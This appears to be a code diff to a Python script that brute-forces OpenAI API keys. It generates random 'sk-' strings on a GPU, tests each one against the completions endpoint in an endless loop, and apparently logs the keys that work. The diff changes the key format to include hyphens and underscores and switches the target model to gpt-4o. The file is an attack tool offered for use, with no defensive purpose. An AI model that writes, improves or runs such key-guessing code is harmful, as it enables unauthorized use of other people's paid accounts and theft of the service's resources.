@@ -21,7 +21,7 @@ def check_internet_connection():
 def generate_random_letters(length):
 
   # Define the characters to choose from
-  characters = string.ascii_letters + string.digits + string.punctuation
+  characters = string.ascii_letters + string.digits
 
   # Convert characters to ASCII codes and create a CUDA tensor
   char_codes = torch.tensor([ord(c) for c in characters], dtype=torch.int32, device='cuda')
@@ -36,6 +36,37 @@ def generate_random_letters(length):
   random_characters = ''.join([chr(code) for code in random_char_codes.cpu().numpy()])
 
   return random_characters
+
+def generate_random_letters_with_symbols(length):
+  """
+  Generates a random string of specified length with hyphens and underscores.
+
+  Args:
+      length (int): The desired length of the random string (excluding symbols).
+
+  Returns:
+      str: The generated random string with symbols inserted.
+  """
+
+  # Generate the base random string
+  base_string = generate_random_letters(length)
+
+  # Determine the number of hyphens and underscores to insert
+  num_hyphens = random.randint(0, 3)
+  num_underscores = random.randint(0, 3)
+
+  # Generate random insertion positions
+  positions = random.sample(range(length + 1), num_hyphens + num_underscores)
+
+  # Insert hyphens and underscores at the chosen positions
+  output_string = list(base_string)
+  for i, pos in enumerate(positions):
+      if i < num_hyphens:
+          output_string.insert(pos, '-')
+      else:
+          output_string.insert(pos, '_')
+
+  return 'sk-' + ''.join(output_string)
 
 print('''
 
@@ -83,7 +114,7 @@ def add_text_to_file(text):
 
 while True:
     if check_internet_connection() is True:
-        test_the_key = 'sk-' + generate_random_letters(48)
+        test_the_key = generate_random_letters_with_symbols(89)
         try:
             client = OpenAI(
             api_key =  test_the_key
@@ -92,7 +123,7 @@ while True:
 
             
             completion = client.completions.create(
-            model = "gpt-4o-mini",
+            model = "gpt-4o",
             prompt = "Test",
             max_tokens = 7,
             temperature = 0
